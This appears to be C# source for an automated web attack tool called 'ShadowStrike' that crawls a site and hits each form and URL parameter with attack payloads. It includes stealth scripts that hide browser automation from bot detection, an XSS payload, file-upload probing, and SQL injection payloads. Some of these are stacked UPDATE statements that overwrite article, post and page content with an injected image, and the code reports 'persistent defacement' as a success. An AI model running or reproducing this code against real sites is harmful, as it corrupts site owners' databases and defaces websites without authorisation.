using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using OpenQA.Selenium;

namespace ShadowStrike.Core
{
    public class AutomatedScanner
    {
        private IWebDriver _driver;
        private SiteCrawler _crawler;

        public class ScanResult
        {
            public string VulnerabilityType { get; set; } = "";
            public string Location { get; set; } = "";
            public string Payload { get; set; } = "";
            public bool Exploited { get; set; }
            public string Proof { get; set; } = "";
            public string Severity { get; set; } = "Medium";
        }

        public class CompleteScanResult
        {
            public SiteCrawler.CrawlResult CrawlResults { get; set; } = new SiteCrawler.CrawlResult();
            public List<ScanResult> Vulnerabilities { get; set; } = new List<ScanResult>();
            public int TotalVulnerabilities => Vulnerabilities.Count;
            public int CriticalVulnerabilities => Vulnerabilities.Count(v => v.Severity == "Critical");
            public int HighVulnerabilities => Vulnerabilities.Count(v => v.Severity == "High");
        }

        public AutomatedScanner(IWebDriver driver)
        {
            _driver = driver;
            _crawler = new SiteCrawler(driver);
        }

        public async Task<CompleteScanResult> AutoScanAndExploitAsync(string startUrl)
        {
            var result = new CompleteScanResult();

            try
            {
                // Phase 1: Crawl the site
                result.CrawlResults = await _crawler.CrawlSiteAsync(startUrl);

                // Phase 2: Test all discovered forms
                var formVulns = await ScanAllFormsAsync(result.CrawlResults.DiscoveredForms);
                result.Vulnerabilities.AddRange(formVulns);

                // Phase 3: Test all URL parameters
                var paramVulns = await ScanAllParametersAsync(result.CrawlResults.DiscoveredPages);
                result.Vulnerabilities.AddRange(paramVulns);

                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Auto scan error: {ex.Message}");
                return result;
            }
        }

        private async Task<List<ScanResult>> ScanAllFormsAsync(List<SiteCrawler.FormInfo> forms)
        {
            var vulnerabilities = new List<ScanResult>();

            foreach (var form in forms)
            {
                try
                {
                    // Navigate to the page with the form
                    _driver.Navigate().GoToUrl(form.Url);
                    
                    // STEALTH: Inject anti-fingerprinting scripts
                    try
                    {
                        var js = (IJavaScriptExecutor)_driver;
                        js.ExecuteScript(@"
                            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                        ");
                    }
                    catch { }

                    await Task.Delay(2000);

                    // Test for XSS in all text inputs
                    foreach (var input in form.Inputs.Where(i => i.Type == "text" || i.Type == "textarea"))
                    {
                        var xssResult = await TestXSSAsync(form, input);
                        if (xssResult != null)
                        {
                            vulnerabilities.Add(xssResult);
                        }
                    }

                    // Test for file upload vulnerabilities
                    if (form.HasFileUpload)
                    {
                        var uploadResult = await TestFileUploadVulnAsync(form);
                        if (uploadResult != null)
                        {
                            vulnerabilities.Add(uploadResult);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error testing form at {form.Url}: {ex.Message}");
                }
            }

            return vulnerabilities;
        }

        private async Task<ScanResult?> TestXSSAsync(SiteCrawler.FormInfo form, SiteCrawler.InputInfo input)
        {
            try
            {
                var xssPayload = "<script>alert('XSS')</script>";

                // Find the input element
                IWebElement? element = null;
                if (!string.IsNullOrEmpty(input.Name))
                {
                    try { element = _driver.FindElement(By.Name(input.Name)); } catch { }
                }
                if (element == null && !string.IsNullOrEmpty(input.Id))
                {
                    try { element = _driver.FindElement(By.Id(input.Id)); } catch { }
                }

                if (element != null)
                {
                    element.Clear();
                    element.SendKeys(xssPayload);

                    // Try to submit the form
                    try
                    {
                        var submitBtn = _driver.FindElement(By.CssSelector("button[type='submit'], input[type='submit']"));
                        submitBtn.Click();
                        await Task.Delay(2000);
                    }
                    catch { }

                    // Check if payload is reflected
                    var pageSource = _driver.PageSource;
                    if (pageSource.Contains(xssPayload) || pageSource.Contains("alert('XSS')"))
                    {
                        return new ScanResult
                        {
                            VulnerabilityType = "XSS (Cross-Site Scripting)",
                            Location = $"{form.Url} - Input: {input.Name}",
                            Payload = xssPayload,
                            Exploited = true,
                            Proof = "Payload reflected in page source without sanitization",
                            Severity = "High"
                        };
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"XSS test error: {ex.Message}");
            }

            return null;
        }

        private async Task<ScanResult?> TestFileUploadVulnAsync(SiteCrawler.FormInfo form)
        {
            try
            {
                // image file
                var testFile = System.IO.Path.GetTempFileName() + ".jpg";
                System.IO.File.WriteAllText(testFile, "Test image content");

                // file input
                var fileInput = _driver.FindElement(By.CssSelector("input[type='file']"));
                fileInput.SendKeys(testFile);

                // before submit
                var beforeUrl = _driver.Url;

                // Submit
                try
                {
                    var submitBtn = _driver.FindElement(By.CssSelector("button[type='submit'], input[type='submit']"));
                    submitBtn.Click();
                    await Task.Delay(3000);
                }
                catch { }

                // Check for success
                var pageSource = _driver.PageSource;
                bool uploadSuccess = pageSource.Contains("success", StringComparison.OrdinalIgnoreCase) ||
                                    pageSource.Contains("uploaded", StringComparison.OrdinalIgnoreCase);

                if (uploadSuccess)
                {
                    await Task.Delay(2000);
                    _driver.Navigate().GoToUrl(beforeUrl);
                    await Task.Delay(2000);

                    var newPageSource = _driver.PageSource;
                    var fileName = System.IO.Path.GetFileName(testFile);
                    
                    // Checking checking
                    bool isPersistent = newPageSource.Contains(fileName) || 
                                       newPageSource.Contains("uploads/") ||
                                       newPageSource.Contains("files/");

                    // Clean up
                    try { System.IO.File.Delete(testFile); } catch { }

                    if (isPersistent)
                    {
                        return new ScanResult
                        {
                            VulnerabilityType = "Persistent File Upload",
                            Location = form.Url,
                            Payload = "Image file upload",
                            Exploited = true,
                            Proof = "✅ FILE STORED IN DATABASE!\n✅ FILE DISPLAYED ON WEBSITE!\n✅ PERSISTENCE VERIFIED!",
                            Severity = "Critical"
                        };
                    }
                    else
                    {
                        return new ScanResult
                        {
                            VulnerabilityType = "Temporary File Upload",
                            Location = form.Url,
                            Payload = "Image file upload",
                            Exploited = false,
                            Proof = "File uploaded but NOT persistent (not stored in database)",
                            Severity = "Low"
                        };
                    }
                }

                // Clean up
                try { System.IO.File.Delete(testFile); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"File upload test error: {ex.Message}");
            }

            return null;
        }

        private async Task<List<ScanResult>> ScanAllParametersAsync(List<string> urls)
        {
            var vulnerabilities = new List<ScanResult>();

            foreach (var url in urls)
            {
                try
                {
                    var uri = new Uri(url);
                    if (!string.IsNullOrEmpty(uri.Query))
                    {
                        // Test for SQL injection
                        var sqlResult = await TestSQLInjectionAsync(url);
                        if (sqlResult != null)
                        {
                            vulnerabilities.Add(sqlResult);
                        }
                    }
                }
                catch { }
            }


            return vulnerabilities;
        }

        private async Task<ScanResult?> TestSQLInjectionAsync(string url)
        {
            try
            {
                var maliciousImage = "https://media.giphy.com/media/YQitE4YNQNahy/giphy.gif";
                var htmlPayload = $"<img src='{maliciousImage}' style='width:100%;max-width:600px;display:block;margin:20px auto;border:3px solid red;'>";
                
                // Test 1: Error-Based SQLi Detection
                var errorPayload = "' OR '1'='1";
                var testUrl = url + errorPayload;

                _driver.Navigate().GoToUrl(testUrl);
                
                // STEALTH
                try
                {
                    var js = (IJavaScriptExecutor)_driver;
                    js.ExecuteScript(@"
                        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
                        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                    ");
                }
                catch { }

                await Task.Delay(2000);

                var pageSource = _driver.PageSource.ToLower();
                bool hasErrorBasedSQLi = pageSource.Contains("sql") ||
                    pageSource.Contains("mysql") ||
                    pageSource.Contains("syntax error") ||
                    pageSource.Contains("database");

                // Test 2: UNION-Based SQLi
                var unionPayload = $"' UNION SELECT '{htmlPayload}' --";
                var unionUrl = url + System.Web.HttpUtility.UrlEncode(unionPayload);
                
                _driver.Navigate().GoToUrl(unionUrl);
                await Task.Delay(2000);
                
                var unionSource = _driver.PageSource;
                bool hasUnionInjection = unionSource.Contains(maliciousImage);

                if (hasUnionInjection)
                {
                    return new ScanResult
                    {
                        VulnerabilityType = "SQLi Defacement (UNION SELECT)",
                        Location = url,
                        Payload = unionPayload,
                        Exploited = true,
                        Proof = $"✅ VISUAL DEFACEMENT SUCCESSFUL!\n\nInjected Image: {maliciousImage}\n\nThe page is displaying our injected content.",
                        Severity = "Critical"
                    };
                }

                // Test 3: UPDATE-Based Persistent SQLi
                var updatePayloads = new[]
                {
                    $"'; UPDATE articles SET content = '{htmlPayload}' WHERE id=1; --",
                    $"'; UPDATE posts SET body = '{htmlPayload}' WHERE id=1; --",
                    $"'; UPDATE pages SET content = '{htmlPayload}' WHERE id=1; --"
                };

                foreach (var updatePayload in updatePayloads)
                {
                    try
                    {
                        var updateUrl = url + System.Web.HttpUtility.UrlEncode(updatePayload);
                        _driver.Navigate().GoToUrl(updateUrl);
                        await Task.Delay(1500);

                        var baseUri = new Uri(url);
                        var baseUrl = $"{baseUri.Scheme}://{baseUri.Host}{baseUri.AbsolutePath}";
                        
                        _driver.Navigate().GoToUrl(baseUrl);
                        await Task.Delay(2000);

                        var updatedSource = _driver.PageSource;
                        if (updatedSource.Contains(maliciousImage))
                        {
                            _driver.Navigate().Refresh();
                            await Task.Delay(2000);
                            
                            var persistentSource = _driver.PageSource;
                            if (persistentSource.Contains(maliciousImage))
                            {
                                return new ScanResult
                                {
                                    VulnerabilityType = "SQLi Persistent Defacement (UPDATE)",
                                    Location = url,
                                    Payload = updatePayload,
                                    Exploited = true,
                                    Proof = $"🔥 PERSISTENT DEFACEMENT ACHIEVED!\n\nDatabase modified via SQL Injection UPDATE\nInjected Image: {maliciousImage}\n\n✅ Persistence verified",
                                    Severity = "Critical"
                                };
                            }
                        }
                    }
                    catch { }
                }

                if (hasErrorBasedSQLi)
                {
                    return new ScanResult
                    {
                        VulnerabilityType = "SQL Injection (Error-Based)",
                        Location = url,
                        Payload = errorPayload,
                        Exploited = false,
                        Proof = "Database error detected, but could not achieve persistent defacement.",
                        Severity = "High"
                    };
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"SQL injection test error: {ex.Message}");
            }

            return null;
        }
    }
}
